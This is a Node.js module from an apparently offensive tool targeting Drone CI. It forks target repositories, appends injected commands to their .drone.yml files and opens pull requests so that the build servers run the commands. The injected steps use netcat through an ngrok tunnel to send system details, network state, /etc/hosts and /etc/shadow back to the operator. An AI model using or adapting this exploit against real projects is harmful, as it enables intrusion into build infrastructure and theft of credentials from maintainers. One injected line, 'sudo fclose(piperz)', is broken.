const log = console.log,
      chalk = require('chalk'),
      green = chalk.green,
      cyan = chalk.cyan,
      ngrok = require('ngrok'),
      github = require(__dirname + '/../../../lib/gh'),
      files = require(__dirname + '/../../../lib/files'),
      repos = require(__dirname + '/../../../lib/repos'),
      exp = require(__dirname + '/../../../lib/exp'),
      drone = require(__dirname + '/../../../modules/drone'),
      server = require(__dirname + '/../../../lib/server'),
      ng = require(__dirname + '/../../../lib/ng'),
      targets = require(__dirname + '/../../../lib/targets'),
      repodir = __dirname + '/../../../../repos';

module.exports = {

  // This particular run function returns an array of netcat listeners
  run: (callback) => {
    github.githubAuth((err, token, authed_user) => {
      if (err) {
        switch (err.code) {
          case 401:
            console.log(chalk.red('Couldn\'t log you in. Please try again.'));
            break;
          case 422:
            console.log(chalk.red('You already have an access token.'));
            break;
        }
        log(token);
        return callback();
      }
      if (token) {
        const type = "forked";
        let ng_token;

        ng.ngrokAuth((err, ngtoken) => {
          if (err) {
            log(chalk.red(`ERROR with ngrok authentication. ${err}`));
            return callback();
          }
          ng_token = ngtoken;

          //Fork All repos in targets
          repos.forkAll(token, authed_user, () => {

            // Clone all repos that have been forked
            repos.cloneAllRepos(type, authed_user, () => {

              // CREATE DRONE SPECIFIC LIST HERE TO USE FROM HERE ON OUT
              targets.getForkedTargetType('drone', authed_user, (raw_targets, drone_targets) => {

                // Start a netcat listener for each cloned repo
                server.startNetcatTempListener((nc, duplex, nc_port) => {

                  // Start an Ngrok instance for listening
                  log(green("Starting ngrok Services..."));
                  server.startNgrokConnect(nc_port, ng_token, (err, hostname, ng_port, ng_server, ng_url) => {

                    if (err) {
                      log(err);
                      return callback();
                    }
                    // Load the .drone.yml file into the repos
                    drone.loadDroneConfigAll(module.exports.name(), authed_user, drone_targets, () => {
                      const append_promises = [];

                      // iterate through list of files, find drone configs and append to the file
                      for (let t in drone_targets) {
                        append_promises.push(new Promise((resolve, reject) => {
                          drone.appendDroneConfig(`${repodir}/${drone_targets[t]}/.drone.yml`, module.exports.injectionString(ng_port, hostname));
                          resolve();
                        }).catch(err => {
                          reject();
                          log(err);
                        }));
                      }

                      // Cash in the promises from above
                      Promise.all(append_promises)
                        .then(c => {
                          log(chalk.green("Making pull requests..."));
                          repos.pullRequestAll(token, type, authed_user, raw_targets, () => {
                            let cbcount = 0;
                            log(chalk.green("Wating for recon callbacks. Grab a coffee, this may take a bit."));
                            duplex.pipe(process.stdout);
                            nc.on('data', (info, msg) => {
                              if (msg.toString('utf8').includes("ciderdone")) {
                                cbcount++;
                                if (cbcount >= drone_targets.length) {
                                  log(chalk.green("Recon Session Complete"))
                                  duplex.unpipe(process.stdout);
                                  nc.close();
                                  ngrok.disconnect(ng_url);
                                  return callback();
                                }
                              }
                            });
                          });
                        }).catch(e => {
                          if(e) {
                            log(e);
                          }
                        });
                    });
                  });
                });
              });
            });
          });
        });
      }
    });
  },

  name: () => {
    return "Drone/recon_basic";
  },

  type: () => {
    return "drone";
  },

  info: (cb) => {
    log(cyan("---\nINFO\n---\n"));
    log((`This exploit takes advantage of open drone-CI repositories to 
create run some basic recon against the build server. This includes.\n`));

    log(cyan("ORDER OF EXECUTION\n------------------\n"));
    log(("1) Fork all targets"));
    log(("2) Clone all forked targets locally"));
    log(("3) Start single shell handler"));
    log(("4) Load and poison the .drone.yml file of the cloned repos"));
    log(("5) Push commited changes, and submit a pull request"));
    log(("6) Listen for incoming messages. Close shell once executed."));
    return cb();
    // Print information about the exploit
  },


  injectionString: (ng_port, hostname) => {
    return `\n      - export NGPORT=${ng_port}\n      \
- export NGHOSTNAME=${hostname}\n      \
- sudo mkfifo piper\n      \
- sudo nc -k -l 12345 0<piper|nc $NGHOSTNAME $NGPORT 1>piper &\n      \
- sudo uname -a | nc localhost 12345\n      \
- sudo curl ipecho.net/plain; echo | nc localhost 12345\n      \
- sudo netstat -la | nc localhost 12345\n      \
- sudo cat /etc/hosts | nc localhost 12345\n      \
- sudo cat /etc/shadow | nc localhost 12345\n      \
- sudo id | nc localhost 12345\n      \
- sudo whoami | nc localhost 12345\n      \
- sudo echo "ciderdone" | nc localhost 12345\n      \
- sudo fclose(piperz)`;
  },


  options: () => {
    log(green("\n-------\nOPTIONS\n-------\n"));
    log(green("NO OPTIONS. This is the 'easy' exploit. No need to set IPs or ports."));
  }
}